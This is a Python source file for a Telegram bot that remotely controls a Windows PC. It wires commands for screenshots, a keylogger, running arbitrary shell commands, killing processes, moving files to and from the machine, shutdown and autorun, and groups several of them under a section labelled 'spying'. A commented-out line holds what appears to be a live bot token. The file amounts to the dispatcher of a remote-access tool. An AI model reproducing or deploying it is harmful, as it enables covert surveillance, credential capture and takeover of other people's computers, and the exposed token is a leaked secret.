
################################################################################ system
from os import getpid
from sys import exit
from time import sleep
from subprocess import call
# import platform
# import wmi
# from threading import Thread

################################################################################ bot
from telebot import TeleBot, apihelper

################################################################################ __volume
from ctypes import cast, POINTER, windll
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume

################################################################################ methods

from .utils import *
from .middleware import *
from .methods import *


################################################################################

class Bot():
    def run(self):
        while True:
            print('[BOT] Bot started')
            self.bot.polling(none_stop=True, interval=0, timeout=20)
            # try:
            #     self.bot.polling(none_stop=True, interval=0, timeout=20)
                # print('[BOT] Bot started')
            # except:
            #     time.sleep(2)



    def __init__(self):
        # data

        self.data = utils.getData()
        if self.data == None:
            exit()

        # self.data = Data(
        #     'oleshko_o',
        #     '5428408141:AAFpzz6uw7VmMyVyqsKiOm5VhZehDFFRGOk'
        # )


        # bot
        apihelper.ENABLE_MIDDLEWARE = True
        self.bot = TeleBot(self.data.TOKEN)
        self.message = None
        self.call = None

        # volume
        self.volDevices = AudioUtilities.GetSpeakers()
        self.volInterface = self.volDevices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        self.vol = cast(self.volInterface, POINTER(IAudioEndpointVolume))

        # screenshot
        self.screenshotCount = 0

        # hibernate
        self.hibernateFlag = False

        # keylogger
        self.keyloggerFlag = False
        self.keyloggerCount = 0
        self.keyloggerKeys = []

        # message box
        self.messageBox = windll.user32.MessageBoxW

        # mouse
        self.curs = 50

        # favourites
        self.appPath = None

        # youtube
        self.MAX_SEARCH_LEN = 5
        self.ytResults = []



        # ? middleware

        # set message
        @self.bot.middleware_handler(update_types=['message'])
        def setMessage(botInstance, message):
            self.message = message

        # set callback
        @self.bot.middleware_handler(update_types=['callback_query'])
        def setCallback(botInstancem, call):
            self.call = call

        # set bot commands
        setBotCommands(self)



        # ! main
        @self.bot.message_handler(commands = ['start'])
        def _startBot(message):
            # self.startBot()
            methods.main.startBot(self)
        
        @self.bot.message_handler(commands = ['stop'])
        def _stopBot(message):
            # self.stopBot()
            methods.main.stopBot(self)

        @self.bot.message_handler(commands = ['help'])
        def _help(message):
            # self.help()
            methods.main.help(self)

        # @self.bot.message_handler(commands = ['autorun_on'])
        # def autorun_on(message):
        #     _autorunOn(self)

        # @self.bot.message_handler(commands = ['autorun_off'])
        # def autorun_off(message):
        #     _autorunOff(self)



        # ! system
        @self.bot.message_handler(commands = ['brightness'])
        def _brightness(message):
            methods.system.brightness(self)

        @self.bot.message_handler(commands = ['volume'])
        def _volume(message):
            methods.system.volume(self)

        @self.bot.message_handler(commands = ['screenshot'])
        def _screenshot(message):
            methods.system.screenshot(self)



        # ! info
        @self.bot.message_handler(commands = ['battery'])
        def _battery(message):
            methods.info.battery(self)

        @self.bot.message_handler(commands = ['ip'])
        def _ip(message):
            methods.info.ip(self)

        @self.bot.message_handler(commands = ['id'])
        def _id(message):
            methods.info.id(self)

        @self.bot.message_handler(commands = ['info'])
        def _pcInfo(message):
            methods.info.pcInfo(self)

        @self.bot.message_handler(commands = ['status'])
        def _pcStatus(message):
            methods.info.pcStatus(self)



        # ! spying
        @self.bot.message_handler(commands = ['keylogger'])
        def _keylogger(message):
            methods.spying.keylogger(self)

        @self.bot.message_handler(commands = ['write', 'text'])
        def _writeText(message):
            methods.spying.writeText(self)

        @self.bot.message_handler(commands = ['msgbox'])
        def _msgbox(message):
            methods.spying.msgbox(self)

        # @self.bot.message_handler(commands = ['mouse'])
        # def _mouse(message):
        #     methods.spying.mouse(self)

        @self.bot.message_handler(commands = ['cmd'])
        def _cmd(message):
            methods.spying.cmd(self)

        @self.bot.message_handler(commands = ['kill'])
        def _killProcess(message):
            methods.spying.killProcess(self)



        # ! buttons
        @self.bot.message_handler(commands = ['previous'])
        def _previousTrack(message):
            methods.buttons.previousTrack(self)

        @self.bot.message_handler(commands = ['next', 'skip'])
        def _nextTrack(message):
            methods.buttons.nextTrack(self)

        @self.bot.message_handler(commands = ['play', 'pause'])
        def _playPauseTrack(message):
            methods.buttons.playPauseTrack(self)

        @self.bot.message_handler(commands = ['collapse'])
        def _collapse(message):
            methods.buttons.collapseProgram(self)

        @self.bot.message_handler(commands = ['show'])
        def _show(message):
            methods.buttons.showProgram(self)

        @self.bot.message_handler(commands = ['close'])
        def _close(message):
            methods.buttons.closeProgram(self)

        @self.bot.message_handler(commands = ['close_tab'])
        def _closeTab(message):
            methods.buttons.closeTab(self)

        @self.bot.message_handler(commands = ['fullscreen'])
        def _fullscreen(message):
            methods.buttons.fullscreen(self)

        @self.bot.message_handler(commands = ['fullmedia'])
        def _fullscreenMedia(message):
            methods.buttons.fullscreenMedia(self)



        # favourites
        @self.bot.message_handler(commands = ['app'])
        def _openApp(message):
            methods.favourites.openApp(self)

        @self.bot.message_handler(commands = ['apps'])
        def _appList(message):
            methods.favourites.appList(self)

        @self.bot.message_handler(commands = ['add_app'])
        def _addApp(message):
            methods.favourites.addApp(self)

        @self.bot.message_handler(commands = ['remove_app'])
        def _removeApp(message):
            methods.favourites.removeApp(self)



        # ! browser
        @self.bot.message_handler(commands = ['browser'])
        def _browserURL(message):
            methods.browser.browserURL(self)

        @self.bot.message_handler(commands = ['search'])
        def _browserSearch(message):
            methods.browser.browserSearch(self)

        @self.bot.message_handler(commands = ['youtube'])
        def _youtubeSearch(message):
            methods.browser.youtubeSearch(self)



        # ! controls
        @self.bot.message_handler(commands = ['lock'])
        def _lockPc(message):
            methods.controls.lockPc(self)

        @self.bot.message_handler(commands = ['shutdown'])
        def _shutdownPc(message):
            methods.controls.shutdownPc(self)

        @self.bot.message_handler(commands = ['reboot'])
        def _rebootPc(message):
            methods.controls.rebootPc(self)

        @self.bot.message_handler(commands = ['hibernate', 'sleep'])
        def _hibernatePc(message):
            methods.controls.hibernatePc(self)



        # ! fileSystem
        @self.bot.message_handler(commands = ['download'])
        def _downloadFile(message):
            methods.fileSystem.downloadFile(self)

        @self.bot.message_handler(commands = ['upload'])
        def _uploadFile(message):
            methods.fileSystem.uploadFile(self)

        # @self.bot.message_handler(commands = ['upload_url'])
        # def _uploadURL(message):
        #     methods.fileSystem.uploadURL(self)



        # callback
        @self.bot.callback_query_handler(func = lambda call: True)
        def _callbackHandler(call):
            callbackHandler(self)


#     @check
#     def startBot(self):
#         self.bot.send_message(self.message.chat.id, '🚀 Bot launched')
#         self.bot.send_message(self.message.chat.id, 'Use  */help*  for more info', parse_mode = 'Markdown')


#     @check
#     def stopBot(self):
#         self.bot.send_message(self.message.chat.id, '*⛔  Bot stopped*', parse_mode = 'Markdown')
#         # subprocess.call('taskkill /f /im host.exe', shell = True)
#         pid = str(getpid())
#         call(f'taskkill /PID {pid} /F', shell = True)


#     @check
#     def help(self):
#         self.bot.send_message(self.message.chat.id,
# '''
# *ℹ️  Information about bot:*\n\n
# *🚀  /start* - Start bot\n
# *⛔  /stop* - Stop bot\n
# *ℹ️   /help* - Commands list\n
# *🏃‍♀️  /autorun_on* - Run the bot after turning on the PC\n
# *🚫  /autorun_off* - Disable bot autorun\n

# *☀️  /brightness* - Set brightness to [value]\n
# *🔊  /volume* - Set volume to [value]\n
# *🏞  /screenshot* - Take a screenshot\n

# *🔋  /battery* - Show battery status\n
# *🛰️  /ip* - Get your IP\n
# *🆔  /id * - Get your telegram ID\n
# *⚙️  /info* - Show PC info\n
# *🖥️  /status* - Show PC status\n

# *⌨️  /keylogger* - Turn on keylogger\n
# *🗨️ /write* - Enter the text like from keyboard\n
# *🗳️  /msgbox* - Displays a message on the PC screen\n
# *🖱  /mouse* - Set mouse position\n
# *👨‍💻  /cmd* - Run command\n
# *💀  /kill* - Kill process\n

# *⏪  /prev* - Previous track\n
# *⏩  /next* - Next track\n
# *⏯  /playpause* - Play/Pause track\n
# *📗  /collapse* - Collapse the program\n
# *📖  /show* - Show the program\n
# *❌  /close* - Close current program\n
# *📕  /close_tab* - Close current tab\n
# *📺  /fullscreen* - Fullscreenf for program\n
# *📺  /fullmedia* - Fullscreen for movie\n

# *👟  /app [app name]* - Open application\n
# *📃  /apps* - Favourite applications\n
# *➕  /add_app* - Add application to favourites\n
# *➖  /remove_app* - Remove application from favourites\n

# *🌐  /browser* - Open URL in browser\n
# *🔍  /search* - Search in browser\n
# *▶️  /youtube* - Search in youtube\n

# *🔒  /lock* - Lock your PC\n
# *⚠️  /shutdown* - Shutdown your PC\n
# *🔄  /reboot* - Restart your PC\n
# *💤  /hibernate* - Hibernate your PC\n

# *⬆️  /download* - Download file from PC\n
# *⬇️  /upload* - Upload file to PC\n
# *🕸️  /download_url* - Download file from URL\n
# ''',
#         parse_mode = 'Markdown')
